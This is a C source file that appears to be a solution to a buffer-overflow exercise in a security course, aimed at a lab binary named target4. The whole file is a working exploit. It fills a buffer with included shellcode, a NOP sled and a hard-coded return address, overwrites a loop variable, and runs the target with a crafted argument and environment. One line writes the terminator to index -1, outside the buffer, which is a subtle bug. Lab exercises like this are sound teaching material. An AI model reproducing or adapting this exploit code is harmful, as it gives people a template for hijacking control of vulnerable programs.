#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"
#define ATTACK_SIZE 237 // 232 + 4 + 1
#define BUFF_ADDR 0x40a4fdc0

int main(void)
{
    char *args[3];
    char *env[15];

    // Allocate the attack_buffer
    char* attack_buffer = (char*)malloc(ATTACK_SIZE);

    // Fill in the shellcode to the front
    int i;
    for (i = 0; i < strlen(shellcode); ++i) {
        attack_buffer[i] = shellcode[i];
    }

    // Fill in the rest with NOP
    for (; i < ATTACK_SIZE - 5; ++i) {
        attack_buffer[i] = 0x90;
    }

    // Overwrite the return address
    int *ptr = (int*)&attack_buffer[i];
    *ptr = BUFF_ADDR;

    // Fill in the NULL terminator
    attack_buffer[-1] = '\0';

    // Overwrite the "i" variable
    ptr = (int*)&attack_buffer[216];
    *ptr = 0x000000c5; // Need three NULLs
    ptr = (int*)&attack_buffer[220];
    *ptr = 0x000000d9; // Need three NULLs


    args[0] = TARGET; 
    args[1] = attack_buffer; 
    args[2] = NULL;
    
    env[0] = "\0";
    env[1] = "\0";
    env[2] = attack_buffer + 220;
    for (i = 3; i < 13; ++i) {
        env[i] = "\0";
    }
    env[i] = attack_buffer + 232;
    env[i+1] = NULL;

    if (0 > execve(TARGET, args, env))
        fprintf(stderr, "execve failed.\n");

    return 0;
}
